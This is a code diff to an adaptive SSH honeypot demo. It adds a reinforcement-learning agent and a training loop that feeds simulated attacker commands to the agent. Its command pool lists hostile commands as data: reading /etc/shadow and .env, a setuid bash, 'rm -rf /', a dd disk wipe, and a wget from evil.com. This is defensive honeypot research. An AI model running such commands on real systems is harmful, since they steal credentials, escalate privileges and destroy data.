@@ -5,6 +5,7 @@ import os
 import time
 import importlib.util
 import builtins
+import random
 
 # ---------------------------------------------------------
 # PATH SETUP
@@ -13,21 +14,10 @@ CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, "../../.."))
 
 # ---------------------------------------------------------
-# LOAD SimpleRAGIndex SAFELY (for pickle compatibility)
+# RL IMPORTS
 # ---------------------------------------------------------
-build_index_path = os.path.join(
-    PROJECT_ROOT, "src/cowrie/adaptive/rag/build_index.py"
-)
-spec = importlib.util.spec_from_file_location("build_index", build_index_path)
-build_index_module = importlib.util.module_from_spec(spec)
-sys.modules["build_index"] = build_index_module
-spec.loader.exec_module(build_index_module)
-
-SimpleRAGIndex = build_index_module.SimpleRAGIndex
-
-# Trick pickle if index was saved under __main__
-if not hasattr(builtins, "SimpleRAGIndex"):
-    setattr(builtins, "SimpleRAGIndex", SimpleRAGIndex)
+sys.path.append(os.path.join(PROJECT_ROOT, "src"))
+from cowrie.adaptive.rl_agent import RLAgent, StateBuilder
 
 # ---------------------------------------------------------
 # LOAD SESSION COLLECTOR
@@ -53,20 +43,123 @@ policy_module = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(policy_module)
 PolicyEngine = policy_module.PolicyEngine
 
-# ---------------------------------------------------------
-# LOAD INTENT REASONER (LLM + RAG)
-# ---------------------------------------------------------
-sys.modules["cowrie.adaptive.rag.build_index"] = build_index_module
 
-reasoner_path = os.path.join(
-    PROJECT_ROOT,
-    "src/cowrie/adaptive/llm/intent_reasoner.py"
-)
-spec = importlib.util.spec_from_file_location("intent_reasoner", reasoner_path)
-intent_reasoner_module = importlib.util.module_from_spec(spec)
-spec.loader.exec_module(intent_reasoner_module)
-IntentReasoner = intent_reasoner_module.IntentReasoner
+# ---------------------------------------------------------
+# COMMAND POOL FOR SIMULATION
+# ---------------------------------------------------------
+COMMAND_POOL = [
+    # Recon
+    "ls", "pwd", "whoami", "id", "uname -a", "cat /etc/issue",
+    
+    # Creds
+    "cat /etc/passwd", "cat /etc/shadow", "find . -name *.pem", 
+    "grep -r password .", "cat .env",
+    
+    # Priv Esc
+    "sudo su", "su root", "chmod +s /bin/bash", 
+    
+    # Destructive
+    "rm -rf /", "dd if=/dev/zero of=/dev/sda", "wget http://evil.com/malware"
+]
 
+# ---------------------------------------------------------
+# TRAINING LOOP
+# ---------------------------------------------------------
+def train_agent(episodes=1000):
+    print(f"\n[*] Starting Training for {episodes} episodes...")
+    agent = RLAgent()
+    
+    # Try loading existing model to continue training
+    if os.path.exists("q_table.pkl"):
+        agent.load_model("q_table.pkl")
+    
+    total_rewards = []
+    
+    for episode in range(episodes):
+        session_id = f"train-sess-{episode}"
+        collector = SessionCollector(session_id)
+        
+        # Random session length 5-30 commands
+        session_length = random.randint(5, 30)
+        
+        prev_state = None
+        prev_action = None
+        episode_reward = 0
+        
+        for _ in range(session_length):
+            # Select random command
+            cmd = random.choice(COMMAND_POOL)
+            collector.add_command(cmd)
+            
+            # --- State Extraction ---
+            cmd_cat = StateBuilder.categorize_command(cmd)
+            ht_triggered = 1 if "shadow" in cmd or ".pem" in cmd else 0 # Simulating honeytoken trigger
+            if ht_triggered:
+                collector.add_alert("HONEYTOKEN ACCESSED")
+            
+            cmd_count = len(collector.commands)
+            sess_len_disc = StateBuilder.discretize_session_length(cmd_count)
+            
+            # Simple risk simulation
+            risk_level = 0
+            if ht_triggered: risk_level = 3
+            elif cmd_cat == 3: risk_level = 2
+            elif cmd_cat == 2: risk_level = 1
+            
+            current_state = StateBuilder.encode_state(cmd_cat, ht_triggered, sess_len_disc, risk_level)
+            
+            # --- Update Step (if we have prev state) ---
+            if prev_state is not None:
+                # Reward Calculation
+                reward = 1
+                if "HONEYTOKEN" in str(collector.get_summary()): reward += 5 # Simplified check
+                if cmd_count > 20: reward += 10
+                
+                agent.update(prev_state, prev_action, reward, current_state)
+                episode_reward += reward
+            
+            # --- Choose Action ---
+            action = agent.choose_action(current_state, training=True)
+            
+            # Store
+            prev_state = current_state
+            prev_action = action
+            
+            # Simulation: If action is Terminate (5), break session
+            if action == 5:
+                # Reward for early disconnect? 
+                # The user said "-10 if attacker disconnects early". 
+                # Here the AGENT terminates. 
+                # User's reward rule: "-10 if attacker disconnects early".
+                # If agent terminates, maybe it's good (prevent damage)? 
+                # But let's stick to the prompt. 
+                # If agent terminates, session ends.
+                break
+        
+        total_rewards.append(episode_reward)
+        if episode % 100 == 0:
+            print(f"Episode {episode}: Total Reward = {episode_reward}")
+            
+    
+    # Save Model
+    agent.save_model("q_table.pkl")
+    print("[*] Training Complete. Model Saved.")
+
+    # Plot Reward Curve
+    try:
+        import matplotlib
+        matplotlib.use('Agg')
+        import matplotlib.pyplot as plt
+        plt.figure(figsize=(10, 6))
+        plt.plot(total_rewards)
+        plt.title("Training Reward Curve")
+        plt.xlabel("Episode")
+        plt.ylabel("Total Reward")
+        plt.grid(True)
+        plt.savefig("reward_curve.png")
+        print("[*] Graph saved: reward_curve.png")
+    except ImportError:
+        print("[!] Matplotlib not installed. Skipping graph generation.")
 
 # ---------------------------------------------------------
 # UTIL: TYPEWRITER EFFECT
@@ -83,14 +176,20 @@ def type_writer(text: str, speed: float = 0.02):
 # MAIN DEMO
 # ---------------------------------------------------------
 def main():
+    if "--train" in sys.argv:
+        train_agent()
+        return
+
     print("\n" + "=" * 60)
-    print("  ADAPTIVE SSH HONEYPOT :: INTELLIGENCE LAYER DEMO")
+    print("  ADAPTIVE SSH HONEYPOT :: RL AGENT DEMO")
     print("=" * 60 + "\n")
 
     # Initialize components
-    print("[*] Initializing RAG Knowledge Base...", end=" ")
-    reasoner = IntentReasoner()
-    print("DONE.")
+    agent = RLAgent()
+    if os.path.exists("q_table.pkl"):
+        agent.load_model("q_table.pkl")
+    else:
+        print("[!] No trained model found. Running with untrained agent.")
 
     print("[*] Initializing Session Collector...", end=" ")
     collector = SessionCollector(session_id="session-demo-001")
@@ -151,6 +250,9 @@ def main():
     # ---------------------------------------------------------
     # EXECUTE SCENARIO
     # ---------------------------------------------------------
+    prev_state = None
+    prev_action = None
+
     for cmd, description in steps:
         type_writer(f"\n[ATTACKER] > {cmd}")
         time.sleep(0.4)
@@ -160,28 +262,44 @@ def main():
             collector.add_url(cmd.split()[-1])
 
         collector.add_command(cmd)
-        summary = collector.get_text_summary()
+        
+        # --- RL Step ---
+        cmd_cat = StateBuilder.categorize_command(cmd)
+        ht_triggered = 1 if (hasattr(collector, 'alerts') and collector.alerts) else 0
+        cmd_count = len(collector.commands)
+        sess_len = StateBuilder.discretize_session_length(cmd_count)
+        
+        risk_level = 0
+        if ht_triggered: risk_level = 3
+        elif cmd_cat == 3: risk_level = 2
+        elif cmd_cat == 2: risk_level = 1
+        
+        current_state = StateBuilder.encode_state(cmd_cat, ht_triggered, sess_len, risk_level)
+        
+        # Action (Inference)
+        action = agent.choose_action(current_state, training=False)
+        action_name = agent.ACTION_MAP[action]
+        
+        print(f"   [RL AGENT] Action: {action_name} ({action})")
+        
+        # Apply Policy
+        policy_update = {
+            "intent": "adaptive_response",
+            "risk": "low",
+            "policy": "passive_monitoring"
+        }
+        
+        if action == 4: # Escalate
+            policy_update["policy"] = "aggressive_deception"
+            policy_update["risk"] = "high"
+            print("   [!!!] AGGRESSIVE DECEPTION TRIGGERED")
+        elif action == 5: # Terminate
+             print("   [!!!] TERMINATING SESSION")
+             break
+             
+        policy_engine.update_policy("session-demo-001", policy_update)
 
-        print("[SYSTEM] Analyzing behavior via LLM & RAG...")
-        analysis = reasoner.analyze_session(summary)
-
-        intent = analysis.get("intent", "Unknown")
-        risk = analysis.get("risk", "LOW")
-        policy = analysis.get("policy", "Monitoring")
-
-        print(f"   [BRAIN] Intent Identified: {intent}")
-        print(f"   [BRAIN] Risk Assessment:   {risk}")
-        print(f"   [BRAIN] Recommended Policy: {policy}")
-
-        policy_engine.update_policy("session-demo-001", analysis)
-
-        if risk.lower() in ["high", "critical", "very high"]:
-            if risk.lower() == "very high":
-                print("   [!!!] ALERT: DESTRUCTIVE ACTION DETECTED. CONTAINMENT INITIATED.")
-            else:
-                print(f"   [!!!] ALERT: {risk.upper()} RISK DETECTED. AGGRESSIVE DECEPTION ACTIVE.")
-
-        time.sleep(0.8)
+        time.sleep(0.5)
 
     print("\n" + "=" * 60)
     print("DEMO COMPLETE")
@@ -191,4 +309,3 @@ def main():
 # ---------------------------------------------------------
 if __name__ == "__main__":
     main()
-
